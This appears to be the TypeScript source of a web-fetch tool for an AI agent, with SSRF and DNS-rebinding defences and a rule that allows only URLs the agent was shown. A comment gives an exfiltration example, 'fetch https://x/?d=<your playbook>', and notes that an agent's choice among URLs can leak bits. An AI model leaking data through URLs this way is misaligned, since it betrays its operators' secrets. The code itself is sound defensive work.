import { lookup as dnsLookup, type LookupAddress } from 'node:dns';
import { request as httpRequest, type IncomingMessage } from 'node:http';
import { request as httpsRequest } from 'node:https';
import { isIP } from 'node:net';
import { jobSteps } from '@hustle/db';
import { eq } from 'drizzle-orm';
import type { Engine } from '../context.ts';
import { jobFilesOf, saveJobFile } from '../files.ts';
import type { JobRow } from '../world/jobs.ts';
import type { ToolRunner } from './index.ts';

/** Most bytes read from a page, and characters kept after turning it into text. */
const MAX_BYTES = 1_000_000;
const MAX_TEXT = 100_000;
/** Idle time allowed between bytes, and the whole request's deadline (a drip-fed page can't hold a loop). */
const TIMEOUT_MS = 12_000;
const DEADLINE_MS = 20_000;
/** Most HTML turned into text: the stripping is linear, but there is no need for more. */
const MAX_HTML = 400_000;
const MAX_REDIRECTS = 3;

/**
 * Whether an address is one an agent may reach: public unicast only. Refused: loopback, private,
 * link-local (cloud metadata lives there), carrier-grade NAT, multicast, reserved and unspecified,
 * for IPv4 and IPv6 (including IPv4-mapped).
 */
export function isPublicAddress(ip: string): boolean {
  const v = isIP(ip);
  if (v === 4) {
    const [a = 0, b = 0] = ip.split('.').map(Number);
    if (a === 0 || a === 10 || a === 127 || a >= 224) return false;
    if (a === 100 && b >= 64 && b <= 127) return false;
    if (a === 169 && b === 254) return false;
    if (a === 172 && b >= 16 && b <= 31) return false;
    if (a === 192 && b === 168) return false;
    if (a === 192 && b === 0) return false;
    if (a === 198 && (b === 18 || b === 19)) return false;
    const c = Number(ip.split('.')[2] ?? 0);
    // Documentation ranges and the old 6to4 relay.
    if (a === 198 && b === 51 && c === 100) return false;
    if (a === 203 && b === 0 && c === 113) return false;
    if (a === 192 && b === 88 && c === 99) return false;
    return true;
  }
  if (v !== 6) return false;
  const bytes = ipv6Bytes(ip);
  if (!bytes) return false;
  const v4 = (at: number) => bytes.slice(at, at + 4).join('.');
  const zeros = (from: number, to: number) => bytes.slice(from, to).every((x) => x === 0);
  // IPv4 inside IPv6 is judged as IPv4: mapped (::ffff:0:0/96), compatible (::/96), NAT64
  // (64:ff9b::/96), 6to4 (2002::/16) and Teredo (2001::/32, client address inverted).
  // The first check below is IPv4-translated (::ffff:0:a.b.c.d).
  if (zeros(0, 8) && bytes[8] === 0xff && bytes[9] === 0xff && zeros(10, 12))
    return isPublicAddress(v4(12));
  if (
    zeros(0, 10) &&
    ((bytes[10] === 0xff && bytes[11] === 0xff) || (bytes[10] === 0 && bytes[11] === 0))
  )
    return zeros(0, 16) ? false : isPublicAddress(v4(12));
  if (
    bytes[0] === 0x00 &&
    bytes[1] === 0x64 &&
    bytes[2] === 0xff &&
    bytes[3] === 0x9b &&
    zeros(4, 12)
  )
    return isPublicAddress(v4(12));
  // Local-use NAT64 (64:ff9b:1::/48) and documentation (2001:db8::/32).
  if (bytes[0] === 0x00 && bytes[1] === 0x64 && bytes[2] === 0xff && bytes[3] === 0x9b)
    return false;
  if (bytes[0] === 0x20 && bytes[1] === 0x01 && bytes[2] === 0x0d && bytes[3] === 0xb8)
    return false;
  if (bytes[0] === 0x20 && bytes[1] === 0x02) return isPublicAddress(v4(2));
  if (bytes[0] === 0x20 && bytes[1] === 0x01 && bytes[2] === 0 && bytes[3] === 0)
    return isPublicAddress(
      bytes
        .slice(12, 16)
        .map((x) => x ^ 0xff)
        .join('.'),
    );
  if ((bytes[0] ?? 0) >= 0xfc && (bytes[0] ?? 0) <= 0xfd) return false; // unique local
  if (bytes[0] === 0xfe && ((bytes[1] ?? 0) & 0x80) === 0x80) return false; // link-local, site-local
  if (bytes[0] === 0xff) return false; // multicast
  if (bytes[0] === 0x01 && zeros(1, 8)) return false; // discard-only
  return true;
}

/** The 16 bytes of an IPv6 address (any textual form, an embedded dotted IPv4 included). */
export function ipv6Bytes(ip: string): number[] | null {
  let text = ip.toLowerCase().replace(/%.*$/, '');
  const dotted = /(\d+\.\d+\.\d+\.\d+)$/.exec(text);
  if (dotted?.[1]) {
    const [a = 0, b = 0, c = 0, d = 0] = dotted[1].split('.').map(Number);
    text = `${text.slice(0, dotted.index)}${((a << 8) | b).toString(16)}:${((c << 8) | d).toString(16)}`;
  }
  const [head = '', tail, extra] = text.split('::');
  if (extra !== undefined) return null;
  const left = head ? head.split(':') : [];
  const right = tail ? tail.split(':') : [];
  const fill = tail === undefined ? 0 : 8 - left.length - right.length;
  if (fill < 0) return null;
  const groups = [...left, ...Array(fill).fill('0'), ...right];
  if (groups.length !== 8 || groups.some((g) => !/^[0-9a-f]{1,4}$/.test(g))) return null;
  return groups.flatMap((g) => {
    const n = Number.parseInt(g, 16);
    return [n >> 8, n & 0xff];
  });
}

/**
 * A DNS lookup that refuses non-public addresses. It runs when each connection is made, so a name
 * that resolves to a public address and then to an internal one (DNS rebinding) is still refused.
 */
function publicLookup(
  hostname: string,
  options: object,
  callback: (
    err: NodeJS.ErrnoException | null,
    address: string | LookupAddress[],
    family?: number,
  ) => void,
): void {
  dnsLookup(hostname, { ...options, all: true }, (err, addresses) => {
    if (err) return callback(err, '', 0);
    const list = addresses as LookupAddress[];
    const bad = list.find((a) => !isPublicAddress(a.address));
    if (bad || list.length === 0) {
      const e = new Error(`${hostname} is not a public address`) as NodeJS.ErrnoException;
      e.code = 'ENOTPUBLIC';
      return callback(e, '', 0);
    }
    const all = (options as { all?: boolean }).all;
    if (all) return callback(null, list);
    return callback(null, list[0]?.address ?? '', list[0]?.family);
  });
}

/** Checks a URL an agent asked for: http(s), default ports, a host name (address literals are refused). */
export function checkUrl(raw: string): URL | string {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return 'not a URL';
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') return 'only http and https';
  if (url.username || url.password) return 'no credentials in URLs';
  if (url.port && url.port !== '80' && url.port !== '443') return 'only the standard ports';
  const host = url.hostname.replace(/^\[|\]$/g, '');
  // Host names only: Node skips the connect-time lookup for an address literal.
  if (isIP(host)) return 'use a host name, not an address';
  if (host === 'localhost' || host.endsWith('.localhost') || host.endsWith('.internal'))
    return 'not a public address';
  return url;
}

/** One GET with the public-only lookup, a byte cap and a time limit; redirects are returned, not followed. */
function get(url: URL): Promise<{ status: number; location?: string; type: string; body: Buffer }> {
  return new Promise((resolve, reject) => {
    // The socket timeout is per idle gap only: this bounds the whole request.
    const deadline = setTimeout(
      () => req.destroy(new Error('the page took too long')),
      DEADLINE_MS,
    );
    const done =
      <T>(fn: (v: T) => void) =>
      (v: T) => {
        clearTimeout(deadline);
        fn(v);
      };
    resolve = done(resolve);
    reject = done(reject);
    const req = (url.protocol === 'https:' ? httpsRequest : httpRequest)(
      url,
      {
        method: 'GET',
        lookup: publicLookup as never,
        headers: {
          'user-agent': 'HustleAgent/1.0 (+reads public pages for a job)',
          accept: 'text/*, application/json, application/xml;q=0.9',
        },
        timeout: TIMEOUT_MS,
      },
      (res: IncomingMessage) => {
        const chunks: Buffer[] = [];
        let size = 0;
        res.on('data', (chunk: Buffer) => {
          size += chunk.length;
          if (size > MAX_BYTES) {
            req.destroy();
            resolve({
              status: res.statusCode ?? 0,
              type: String(res.headers['content-type'] ?? ''),
              body: Buffer.concat(chunks),
            });
            return;
          }
          chunks.push(chunk);
        });
        res.on('end', () =>
          resolve({
            status: res.statusCode ?? 0,
            ...(res.headers.location ? { location: res.headers.location } : {}),
            type: String(res.headers['content-type'] ?? ''),
            body: Buffer.concat(chunks),
          }),
        );
        res.on('error', reject);
      },
    );
    // Backstop: whatever resolved, the address actually connected to must be public.
    req.on('socket', (socket) => {
      socket.on('connect', () => {
        if (!isPublicAddress(socket.remoteAddress ?? ''))
          req.destroy(new Error('not a public address'));
      });
    });
    req.on('timeout', () => req.destroy(new Error('timed out')));
    req.on('error', reject);
    req.end();
  });
}

/** Drops each `<tag …>…</tag>` block for the tags given, in one pass (no backtracking regex). */
function stripBlocks(html: string, tags: readonly string[]): string {
  const lower = html.toLowerCase();
  let out = '';
  let at = 0;
  while (at < html.length) {
    let next = -1;
    let tag = '';
    for (const t of tags) {
      const k = lower.indexOf(`<${t}`, at);
      if (k !== -1 && (next === -1 || k < next)) {
        next = k;
        tag = t;
      }
    }
    if (next === -1) break;
    out += html.slice(at, next);
    const close = lower.indexOf(`</${tag}`, next);
    if (close === -1) return out; // Unclosed: the rest is that block.
    const end = lower.indexOf('>', close);
    at = end === -1 ? html.length : end + 1;
    out += ' ';
  }
  return out + html.slice(at);
}

/** Page text: an HTML page without its scripts, styles and tags; anything else as it came. */
export function textOf(body: string, type: string): string {
  if (!/html/i.test(type)) return body;
  return stripBlocks(body.slice(0, MAX_HTML), ['script', 'style', 'noscript', 'svg', 'template'])
    .replace(/<br\s*\/?>|<\/(p|div|li|tr|h[1-6]|section|article)>/gi, '\n')
    .replace(/<[^<>]*>/g, ' ')
    .replace(/&nbsp;/g, ' ')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&')
    .replace(/[ \t]+/g, ' ')
    .replace(/\n\s*\n+/g, '\n\n')
    .trim();
}

/** Fetches a job may make in all, and to any one site (counting attempts, failed ones too). */
const MAX_FETCHES = 5;
const MAX_PER_SITE = 2;

/** Every http(s) URL written in a text, normalised. */
function urlsIn(text: string): Set<string> {
  const found = new Set<string>();
  for (const m of text.matchAll(/https?:\/\/[^\s<>"'`)\]]+/g)) {
    try {
      found.add(new URL(m[0].replace(/[.,;:!?]+$/, '')).href);
    } catch {
      // Not a URL after all.
    }
  }
  return found;
}

/**
 * The site a host belongs to, near enough: its last two labels, or three under a two-letter
 * second-level label (`bbc.co.uk`). Subdomains of one site share its cap.
 */
export function siteOf(host: string): string {
  const labels = host.toLowerCase().replace(/\.$/, '').split('.');
  const take =
    labels.length > 2 && (labels.at(-2)?.length ?? 0) <= 3 && (labels.at(-1)?.length ?? 0) === 2
      ? 3
      : 2;
  return labels.slice(-take).join('.');
}

/**
 * Whether the agent may fetch a URL: it must appear, exactly, in the brief, a client file or chain
 * data, or among the results a search engine returned (stored apart from anything the model wrote;
 * never a page it fetched). An agent never fetches a URL it
 * composed, so "fetch https://x/?d=<your playbook>" can't carry a secret out. What remains is choice:
 * picking among URLs it was shown signals a little, so pages it read add no choices, and every
 * attempt counts toward 5 a job and 2 a site. A client who writes many URLs into its own brief could
 * still learn a few bits from which ones the agent picks.
 */
export async function seenUrl(
  engine: Engine,
  job: JobRow,
  url: URL,
): Promise<{ ok: true } | { ok: false; reason: string }> {
  const files = (await jobFilesOf(engine, job.id)).filter(
    (f) => f.source === 'client' || f.source === 'tool:chain_data',
  );
  const steps = await engine.db
    .select({
      action: jobSteps.action,
      args: jobSteps.args,
      input: jobSteps.input,
      sources: jobSteps.sources,
    })
    .from(jobSteps)
    .where(eq(jobSteps.jobId, job.id));
  const tried = steps.filter((s) => s.action === 'fetch');
  if (tried.length >= MAX_FETCHES)
    return { ok: false, reason: `at most ${MAX_FETCHES} pages a job` };
  const site = siteOf(url.hostname);
  const sameSite = tried.filter((s) => {
    const asked = (s.input.trim() || s.args).split(/\s+/)[0] ?? '';
    try {
      return siteOf(new URL(asked).hostname) === site;
    } catch {
      return false;
    }
  });
  if (sameSite.length >= MAX_PER_SITE)
    return { ok: false, reason: `at most ${MAX_PER_SITE} pages a job from ${site}` };
  const shown = [job.body, ...files.map((f) => f.content)];
  if (shown.some((text) => urlsIn(text).has(url.href))) return { ok: true };
  // Search results as the engine returned them, never the notes the model wrote about them.
  const found = steps.flatMap((s) => s.sources ?? []).flatMap((u) => [...urlsIn(u)]);
  if (found.includes(url.href)) return { ok: true };
  return {
    ok: false,
    reason: 'only URLs from the brief, its files or your search results can be fetched',
  };
}

/**
 * Reads one public web page, API answer or dataset for the agent loop: GET only, public addresses
 * only (checked at every connection and redirect), size and time capped, text kept. The page is saved
 * as a job file, so the agent can analyse it in Python, and named with its source on the step.
 */
export const fetchPage: ToolRunner = {
  id: 'fetch',
  async run(engine, _agent, job, _spec, use) {
    if (!use) return { ok: false, reason: 'no URL' };
    const asked = use.input.split(/\s+/)[0] ?? '';
    let url = checkUrl(asked);
    if (typeof url !== 'string') {
      const allowed = await seenUrl(engine, job, url);
      if (!allowed.ok) return { ok: false, reason: allowed.reason };
    }
    for (let hop = 0; hop <= MAX_REDIRECTS; hop++) {
      if (typeof url === 'string') return { ok: false, reason: url };
      let res: Awaited<ReturnType<typeof get>>;
      try {
        res = await get(url);
      } catch (err) {
        return { ok: false, reason: String((err as Error).message ?? err).slice(0, 120) };
      }
      if (res.status >= 300 && res.status < 400 && res.location) {
        url = checkUrl(new URL(res.location, url).href);
        continue;
      }
      if (res.status >= 400) return { ok: false, reason: `the page answered ${res.status}` };
      if (
        !/^(text\/|application\/(json|xml|[\w.+-]*\+(json|xml))|application\/csv)/i.test(res.type)
      )
        return { ok: false, reason: `not text (${res.type || 'unknown type'})` };
      const text = textOf(res.body.toString('utf8'), res.type).slice(0, MAX_TEXT);
      const ext = /json/i.test(res.type) ? 'json' : /csv/i.test(res.type) ? 'csv' : 'txt';
      const name = `fetched_${url.hostname.replace(/[^\w.-]/g, '_').slice(0, 50)}_${use.key.split(':').pop()}.${ext}`;
      await saveJobFile(engine, job.id, name, text, 'tool:fetch');
      return {
        ok: true,
        notes: `${text.slice(0, 6_000)}${text.length > 6_000 ? `\n\n[… ${text.length.toLocaleString('en')} characters in all, saved as ${name}]` : `\n\n[saved as ${name}]`}`,
        sources: [{ title: url.hostname, url: url.href }],
        cost: 0n,
      };
    }
    return { ok: false, reason: 'too many redirects' };
  },
};
